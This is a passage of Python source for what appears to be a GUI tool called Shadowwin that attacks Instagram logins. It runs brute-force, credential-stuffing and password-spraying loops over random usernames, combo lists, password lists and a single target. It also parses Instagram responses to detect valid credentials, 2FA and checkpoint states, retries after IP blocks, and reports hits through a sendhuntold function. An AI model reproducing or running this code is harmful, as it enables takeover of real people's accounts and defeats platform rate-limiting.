                self.password =  Password
                lock.acquire()
                if Username not in blacklist:
                    State = "2FA"
                    sendhuntold(Username, Password, State)
                lock.release()
            elif "'username': 'Instagram User'"in req.text:
                self.phonereq+=1
                self.username = Username
                self.password =  Password
                lock.acquire()
                if Username not in blacklist:
                    State = "selfi"
                    sendhuntold(Username, Password, State)
                lock.release()
            elif "The password that you've entered is incorrect. Please try again." in req.text:
                self.Att += 1
                self.username = Username
                self.password =  Password
            elif "The username you entered doesn't appear to belong to an account. Please check your username and try again." in req.text and '"error_type":"ip_block"' not in req.text:
                self.notfound += 1
                self.username = Username
                self.password =  Password
            elif "challenge_required" in req.text:
                self.secure += 1
                self.username = Username
                self.password =  Password
                lock.acquire()
                if Username not in blacklist:
                    State = "Secure"
                    sendhuntold(Username, Password, State)
                lock.release()
            elif '{"message":"The username you entered doesn\'t appear to belong to an account. Please check your username and try again.","status":"fail","error_type":"ip_block"}' in req.text:
                self.Rl += 1
                self.username = Username
                self.password =  Password
                Username = self.username
                Password = self.password
                self.checker(Username,Password)
        except Exception as e:
            self.error += 1
            Username = Username
            Password = Password
            self.checker(Username,Password)
    def organizer(self):
        if self.chooses == "1":
            while self.go:
                try:
                    
                    if self.pick == "1":
                        self.lenth = ['4','3']
                        ca =  int(random.choice(self.lenth))
                        Username = Randomis(ca)
                        self.passwords = []
                        with open(f'{self.pass_file}', 'r', encoding="utf-8") as f:
                            for x in f.read().splitlines():
                                self.passwords.append(x)
                        Password = random.choice(self.passwords)
                        self.checkerold(Username, Password)
                    elif self.pick == "2":
                        self.lenth = ['4','3']
                        ca =  int(random.choice(self.lenth))
                        Username = Randomis(ca)
                        self.passwords = []
                        with open(f'{self.pass_file}', 'r', encoding="utf-8") as f:
                            for x in f.read().splitlines():
                                self.passwords.append(x)
                        Password = random.choice(self.passwords)
                        self.checker(Username,Password)
                    elif self.pick == "3":
                        self.lenth = ['4','3']
                        ca =  int(random.choice(self.lenth))
                        Username = Randomis(ca)
                        self.passwords = []
                        with open(f'{self.pass_file}', 'r', encoding="utf-8") as f:
                            for x in f.read().splitlines():
                                self.passwords.append(x)
                        Password = random.choice(self.passwords)
                        self.checkerweb(Username,Password)
                except Exception as e:
                    pass
        elif self.chooses == "2":
            while self.go:
                try:

                    combo = str(self.q.get())
                    Username, Password = combo.split(":") 
                    if self.pick == "1":
                        self.checkerold(Username, Password)
                    elif self.pick == "2":
                        self.checker(Username,Password)
                    elif self.pick == "3":
                                self.checkerweb(Username, Password)
                except Exception as e:
                    pass
        elif self.chooses == "3":
            while self.go:
                try:
                    with open(f"{self.fileuser}", "r") as self.list:
                        self.users = self.list.readlines()
                        for account in self.users:
                            Username = account.split('\n')[0]
                            Password =f"{Username}{Username}"
                            if self.pick == "1":
                                self.checkerold(Username, Password)
                            elif self.pick == "2":
                                self.checker(Username,Password)
                            elif self.pick == "3":
                                self.checkerweb(Username, Password)
                except:
                    pass
        elif self.chooses == "4":
            while self.go:
                try:
                    with open(f"{self.fileuser}", "r") as self.list:
                        self.users = self.list.readlines()
                        Username = random.choice(self.users)
                    with open(f"{self.filepass  }", "r") as self.sz:
                        self.passwords = self.sz.readlines()
                        Password = random.choice(self.passwords)        
                    if self.pick == "1":
                        self.checkerold(Username, Password)
                    elif self.pick == "2":
                        self.checker(Username,Password)
                    elif self.pick == "3":
                                self.checkerweb(Username, Password)
                except Exception as e:
                    print("Error", e)
        elif self.chooses == "5":
            while self.go:
                try:
                    with open(f"{self.filepass}", "r") as self.list:
                        self.passz = self.list.readlines()
                        for account in self.passz:
                            Password = account.split('\n')[0]
                            Username = self.target
                            if self.pick == "1":
                                self.checkerold(Username, Password)
                            elif self.pick == "2":
                                self.checker(Username,Password)
                            elif self.pick == "3":
                                self.checkerweb(Username, Password)
                except:
                    pass
        elif self.chooses == "6":
            while self.go:
                try:
                    with open(f"{self.fileuser}", "r") as self.list:
                        self.users = self.list.readlines()
                        for account in self.users:
                            Username = account.split('\n')[0]
                            Password = self.zpasspass
                            if self.pick == "1":
                                self.checkerold(Username, Password)
                            elif self.pick == "2":
                                self.checker(Username,Password)
                            elif self.pick == "3":
                                self.checkerweb(Username, Password)
                except:
                    pass

if __name__ == "__main__":
    app = QApplication(sys.argv)
    ex = Shadowwin()
    ex.show()
    sys.exit(app.exec_())

